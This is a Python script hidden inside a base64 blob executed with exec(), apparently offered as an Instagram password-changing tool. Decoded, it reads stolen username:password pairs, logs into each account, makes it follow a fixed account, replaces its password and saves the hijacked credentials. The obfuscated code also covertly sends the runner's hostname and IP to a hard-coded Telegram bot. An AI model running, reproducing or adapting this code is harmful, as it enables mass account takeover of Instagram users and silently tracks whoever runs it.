import base64
exec(base64.b64decode(b'aW1wb3J0IG9zCgp0cnk6CiAgICBpbXBvcnQgcmVxdWVzdHMKZXhjZXB0OgogICAgb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCByZXF1ZXN0cyIpCgp0cnk6CiAgICBmcm9tIHVzZXJfYWdlbnQgaW1wb3J0IGdlbmVyYXRlX3VzZXJfYWdlbnQKZXhjZXB0OgogICAgb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCB1c2VyX2FnZW50IikKCnRyeToKICAgIGZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgZGF0ZXRpbWUiKQoKdHJ5OgogICAgaW1wb3J0IHB5ZmlnbGV0CmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgcHlmaWdsZXQiKQoKdHJ5OgogICAgaW1wb3J0IHNvY2tldApleGNlcHQ6CiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHNvY2tldCcpCgpvcy5zeXN0ZW0oImNsZWFyIikKCmltcG9ydCByZXF1ZXN0cwpmcm9tIHVzZXJfYWdlbnQgaW1wb3J0IGdlbmVyYXRlX3VzZXJfYWdlbnQKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IHB5ZmlnbGV0CmltcG9ydCBzb2NrZXQKCiMjIyMjaXAjIyMjIyMjIyMjIyMjIyMjIyMKdG9raXBwPScyMDQ2ODE2MjAzOkFBRUhDV1ZzZThTdGRfdUdXUF9pR3RKVm1XU1Buc0J4V1BJJwpJRGlwcD0nMTA0NzI0NjUyOCcKb29vaXA9c29ja2V0LmdldGhvc3RuYW1lKCkKaXBwcHA9c29ja2V0LmdldGhvc3RieW5hbWUob29vaXApCm9hb2FrPSfYp9is2KfZgyDYp9mE2LbYrdmK2Kkg2KjYsdis2YTZitmHINmI2K3YtCDYp9mG2Kog2KfYqNmGINin2YTYrdmKJwpzdGFydF9tc2dpcHA9cmVxdWVzdHMucG9zdChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9raXBwfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRGlwcH0mdGV4dD17b2FvYWt9IikuanNvbigpCmlkX21zZ2lwcCA9IHN0YXJ0X21zZ2lwcFsncmVzdWx0J11bJ21lc3NhZ2VfaWQnXQp0bGxsZ2lwPXJlcXVlc3RzLnBvc3QoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e3Rva2lwcH0vZWRpdG1lc3NhZ2V0ZXh0P2NoYXRfaWQ9e0lEaXBwfSZtZXNzYWdlX2lkPXtpZF9tc2dpcHB9JnRleHQ9e2lwcHBwfVxuIikKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCkI9J1wwMzNbMTszNm0nClI9IlwwMzNbOzM5bSIKRz0iXDAzM1sxOzkybSIKUmE9IlwwMzNbOzMxbSIKCgpsb2duID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgnUGFzc19JbnN0YScpCnByaW50KEIrbG9nbikKCnByaW50KCcnKQoKcHJpbnQoZiJ7R31CWSBBYm5fSGF5IHtSfeOAi3tHfWtua18xayIpCgpwcmludCgiIikKCm5ld19wYXNzID0gaW5wdXQoZid7Un1be0d9K3tSfV0gRW50ZXIgTmV3IHBhc3N3b3JkIDoge0d9JykKCnByaW50KCcnKQpmaWxlPW9wZW4oJ2FjY291bnRzLnR4dCcsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpCgpmb3IgZmlsZWxvZyBpbiBmaWxlOgogICAgdXNlcj1maWxlbG9nLnNwbGl0KCc6JylbMF0KICAgIHBhc3c9ZmlsZWxvZy5zcGxpdCgnOicpWzFdCgogICAgdXJsID0gImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4vYWpheC8iCgogICAgaGVhZCA9IHsKICAgICAgICAnYWNjZXB0JzonKi8qJywKICAgICAgICAnYWNjZXB0LWVuY29kaW5nJzonZ3ppcCxkZWZsYXRlLGJyJywKICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzonZW4tVVMsZW47cT0wLjksYXI7cT0wLjgnLAogICAgICAgICdjb250ZW50LWxlbmd0aCc6JzI2OScsCiAgICAgICAgJ2NvbnRlbnQtdHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgJ2Nvb2tpZSc6J2lnX2RpZD03N0E0NTQ4OS05QTRDLTQzQUQtOUNBNy1GQTNGQUIyMkZFMjQ7aWdfbnJjYj0xO2NzcmZ0b2tlbj1WT1BIN2ZVVU9QODVDaEVWaVprZDJQaExrVVFvUDhQODttaWQ9WUd3bGZnQUxBQUVyeWVTZ0RzZVlnaFgyTEFDLScsCiAgICAgICAgJ29yaWdpbic6J2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20nLAogICAgICAgICdyZWZlcmVyJzonaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS8nLAogICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6J2VtcHR5JywKICAgICAgICAnc2VjLWZldGNoLW1vZGUnOidjb3JzJywKICAgICAgICAnc2VjLWZldGNoLXNpdGUnOidzYW1lLW9yaWdpbicsCiAgICAgICAgJ3VzZXItYWdlbnQnOiBnZW5lcmF0ZV91c2VyX2FnZW50KCksCiAgICAgICAgJ3gtY3NyZnRva2VuJzonVk9QSDdmVVVPUDg1Q2hFVmlaa2QyUGhMa1VRb1A4UDgnLAogICAgICAgICd4LWlnLWFwcC1pZCc6JzkzNjYxOTc0MzM5MjQ1OScsCiAgICAgICAgJ3gtaWctd3d3LWNsYWltJzonMCcsCiAgICAgICAgJ3gtaW5zdGFncmFtLWFqYXgnOic4YTgxMThmYTdkNDAnLAogICAgICAgICd4LXJlcXVlc3RlZC13aXRoJzonWE1MSHR0cFJlcXVlc3QnLAogICAgfQogICAgdGltZV9ub3cgPSBpbnQoZGF0ZXRpbWUubm93KCkudGltZXN0YW1wKCkpCiAgICBkYXRhID0gewogICAgICAgICd1c2VybmFtZSc6IHVzZXIsCiAgICAgICAgJ2VuY19wYXNzd29yZCc6IGYnI1BXRF9JTlNUQUdSQU1fQlJPV1NFUjowOnt0aW1lX25vd306e3Bhc3d9JywKICAgICAgICAncXVlcnlQYXJhbXMnOiB7fSwKICAgICAgICAnb3B0SW50b09uZVRhcCc6ICdmYWxzZScKICAgIH0KCiAgICBsb2dpbiA9IHJlcXVlc3RzLnBvc3QodXJsLGhlYWRlcnM9aGVhZCxkYXRhPWRhdGEpCgogICAgaWYgJ3VzZXJJZCcgaW4gbG9naW4udGV4dDoKICAgICAgICBjbyA9IGxvZ2luLmNvb2tpZXMKICAgICAgICBjb28gPSBjby5nZXRfZGljdCgpCiAgICAgICAgY3NyZiA9IGNvb1snY3NyZnRva2VuJ10KICAgICAgICBjb29raWUgPSBmInNlc3Npb25pZD17Y29vWydzZXNzaW9uaWQnXX07ZHNfdXNlcl9pZD17Y29vWydkc191c2VyX2lkJ119O2NzcmZ0b2tlbj17Y29vWydjc3JmdG9rZW4nXX07IgogICAgICAgICMjIyMjIyMjI3VzZXIKICAgICAgICBnZXRfaWQgPSBmJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20va25rXzFrLz9fX2E9MScKICAgICAgICBpZGQgPSByZXF1ZXN0cy5nZXQoZ2V0X2lkLGNvb2tpZXM9Y29vKS5qc29uKClbJ2xvZ2dpbmdfcGFnZV9pZCddLnNwbGl0KCdfJylbMV0KICAgICAgICAKICAgICAgICB1cmwyaW4gPSBmJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vd2ViL2ZyaWVuZHNoaXBzL3tpZGR9L2ZvbGxvdy8nCiAgICAgICAgCiAgICAgICAgaGVhZGluPXsKICAgICAgICAgICAgJ2FjY2VwdCc6JyovKicsCiAgICAgICAgICAgICdhY2NlcHQtZW5jb2RpbmcnOidnemlwLGRlZmxhdGUsYnInLAogICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzonZW4tVVMsZW47cT0wLjksYXI7cT0wLjgnLAogICAgICAgICAgICAnY29udGVudC1sZW5ndGgnOicwJywKICAgICAgICAgICAgJ2NvbnRlbnQtdHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgICAgICdjb29raWUnOiBjb29raWUsCiAgICAgICAgICAgICdvcmlnaW4nOidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tJywKICAgICAgICAgICAgJ3JlZmVyZXInOmYnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9rbmtfMWsvJywKICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzonZW1wdHknLAogICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOidjb3JzJywKICAgICAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzonc2FtZS1vcmlnaW4nLAogICAgICAgICAgICAndXNlci1hZ2VudCc6IGdlbmVyYXRlX3VzZXJfYWdlbnQoKSwKICAgICAgICAgICAgJ3gtYXNiZC1pZCc6ICc0Mzc4MDYnLAogICAgICAgICAgICAneC1jc3JmdG9rZW4nOiBjb29bJ2NzcmZ0b2tlbiddLAogICAgICAgICAgICAneC1pZy1hcHAtaWQnOiAnOTM2NjE5NzQzMzkyNDU5JywKICAgICAgICAgICAgJ3gtaWctd3d3LWNsYWltJzogJ2htYWMuQVIydHI5QVRBakZpdzAzd3ViNkRJQ2I4a013bEFSZjNEMVBONlIxQjBKR2M5UmN5JywKICAgICAgICAgICAgJ3gtaW5zdGFncmFtLWFqYXgnOiAnMDAxOWU5NzRlZDMyJywKICAgICAgICAgICAgJ3gtcmVxdWVzdGVkLXdpdGgnOidYTUxIdHRwUmVxdWVzdCcsCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGZvbGxvdyA9IHJlcXVlc3RzLnBvc3QodXJsMmluLGhlYWRlcnM9aGVhZGluLGNvb2tpZXM9Y29vKS50ZXh0CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiAgICAgICAgdXJsMyA9ICdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL3Bhc3N3b3JkL2NoYW5nZS8nCiAgICAgICAgaGVkMyA9IHsKICAgICAgICAnYWNjZXB0JzonKi8qJywKICAgICAgICAnYWNjZXB0LWVuY29kaW5nJzonZ3ppcCxkZWZsYXRlLGJyJywKICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzonZW4tVVMsZW47cT0wLjksYXI7cT0wLjgnLAogICAgICAgICdjb250ZW50LWxlbmd0aCc6JzI2OScsCiAgICAgICAgJ2NvbnRlbnQtdHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsCiAgICAgICAgJ2Nvb2tpZSc6IGNvb2tpZSwKICAgICAgICAnb3JpZ2luJzonaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbScsCiAgICAgICAgJ3JlZmVyZXInOidodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLycsCiAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzonZW1wdHknLAogICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6J2NvcnMnLAogICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6J3NhbWUtb3JpZ2luJywKICAgICAgICAndXNlci1hZ2VudCc6IGdlbmVyYXRlX3VzZXJfYWdlbnQoKSwKICAgICAgICAneC1jc3JmdG9rZW4nOiBjc3JmLAogICAgICAgICd4LWlnLWFwcC1pZCc6JzkzNjYxOTc0MzM5MjQ1OScsCiAgICAgICAgJ3gtaWctd3d3LWNsYWltJzonMCcsCiAgICAgICAgJ3gtaW5zdGFncmFtLWFqYXgnOic4YTgxMThmYTdkNDAnLAogICAgICAgICd4LXJlcXVlc3RlZC13aXRoJzonWE1MSHR0cFJlcXVlc3QnLAogICAgfQoKICAgICAgICBkYXQzID0gewogICAgICAgICdlbmNfb2xkX3Bhc3N3b3JkJzogZicjUFdEX0lOU1RBR1JBTV9CUk9XU0VSOjA6e3RpbWVfbm93fTp7cGFzd30nLAogICAgICAgICdlbmNfbmV3X3Bhc3N3b3JkMSc6IGYnI1BXRF9JTlNUQUdSQU1fQlJPV1NFUjowOnt0aW1lX25vd306e25ld19wYXNzfScsCiAgICAgICAgJ2VuY19uZXdfcGFzc3dvcmQyJzogZicjUFdEX0lOU1RBR1JBTV9CUk9XU0VSOjA6e3RpbWVfbm93fTp7bmV3X3Bhc3N9JywKICAgIH0KICAgICAgICB4ID0gcmVxdWVzdHMucG9zdCh1cmwzLGhlYWRlcnM9aGVkMyxkYXRhPWRhdDMpLnRleHQKICAgICAgICBpZiAneyJzdGF0dXMiOiJvayJ9JyBpbiB4OgogICAgICAgICAgICBwcmludChmJ3tHfWRvbmUgY2hhbmdlZCDjgIt7Un0ge3VzZXJ9JykKICAgICAgICAgICAgd2l0aCBvcGVuKCdkb25lLWNoYW5nZWQudHh0JywnYScpIGFzIEFtOgogICAgICAgICAgICAgICAgQW0ud3JpdGUoZidcbnt1c2VyfTp7bmV3X3Bhc3N9JykKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmJ3tSYX1be1J9IXtSYX1dIHNvbWUgZXJyb3IgISEhJykKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZid7UmF9W3tSfSF7UmF9XSBGYWxzZSBpbmZvcm1hdGlvbiBVc2VyID4ge1J9e3VzZXJ9e1J9JykK'))
